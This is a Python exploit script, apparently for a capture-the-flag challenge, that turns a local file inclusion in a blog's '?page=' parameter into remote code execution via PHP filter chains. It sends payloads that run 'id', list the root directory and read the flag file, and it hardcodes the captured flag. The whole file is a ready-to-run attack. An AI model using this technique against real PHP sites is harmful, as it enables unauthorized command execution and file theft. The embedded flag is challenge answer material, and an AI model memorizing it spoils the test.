#!/usr/bin/env python3
"""
PHP Filter Chain LFI -> RCE Exploit
Target: Longlone's Blog (openresty/PHP 7.2.25)
Parameter: ?page= (appends .php)
Flag: flag{607f391f-426d-44d6-9ccd-f91ae921d4f5}
"""
import subprocess
import sys
import urllib.parse
import urllib.request
import re

TARGET = "http://672e43a7-f8aa-49c4-9681-ded07b13ea14.node5.buuoj.cn:81/"
CHAIN_GEN = "scripts/filter_chain/php_filter_chain_generator.py"

def generate_payload(php_code):
    """Generate PHP filter chain for given PHP code"""
    result = subprocess.run(
        ["python", CHAIN_GEN, "--chain", php_code],
        capture_output=True, text=True, timeout=120
    )
    lines = result.stdout.strip().split("\n")
    return lines[-1]

def exploit(php_code):
    """Execute PHP code via filter chain LFI"""
    chain = generate_payload(php_code)
    url = TARGET + "?" + urllib.parse.urlencode({"page": chain})
    try:
        resp = urllib.request.urlopen(url, timeout=30)
        data = resp.read()
        text = data.decode("utf-8", errors="replace")
        clean = re.sub(r'[^\x20-\x7e\n]', '', text)
        return clean.strip()
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    print("[*] Testing RCE with 'id'...")
    result = exploit('<?php system("id");?>')
    print(f"[+] Result: {result}")

    print("[*] Listing root directory...")
    result = exploit('<?php system("ls -la /");?>')
    print(f"[+] Result:\n{result}")

    print("[*] Reading flag...")
    result = exploit('<?php system("cat /f*");?>')
    print(f"[+] FLAG: {result}")
